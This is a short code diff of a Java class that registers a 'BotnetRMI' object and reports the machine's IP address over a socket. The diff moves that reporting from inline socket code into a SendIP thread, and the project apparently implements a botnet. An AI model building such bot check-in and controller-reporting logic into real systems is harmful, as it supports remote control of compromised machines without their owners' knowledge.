@@ -60,15 +60,8 @@ public class RMIClient {
             String ip = getIP();
             Naming.bind("rmi:/" + ip + ":1234/BotnetRMI", botnet);
             System.out.println(">>>>>INFO: RMI Server started!!!!!!!!");
-            Socket socket = new Socket("127.0.0.1", 2345);
-            BufferedWriter writer = new BufferedWriter (new OutputStreamWriter(socket.getOutputStream()));
-            if (ip != null){
-                writer.write(ip);
-                writer.write("\n");
-                writer.flush();
-            }
-            writer.close();
-            socket.close();
+            SendIP send = new SendIP(ip);
+            send.start();
         } catch (RemoteException ex) {
             Logger.getLogger(RMIClient.class.getName()).log(Level.SEVERE, null, ex);
         } catch (MalformedURLException | AlreadyBoundException ex) {
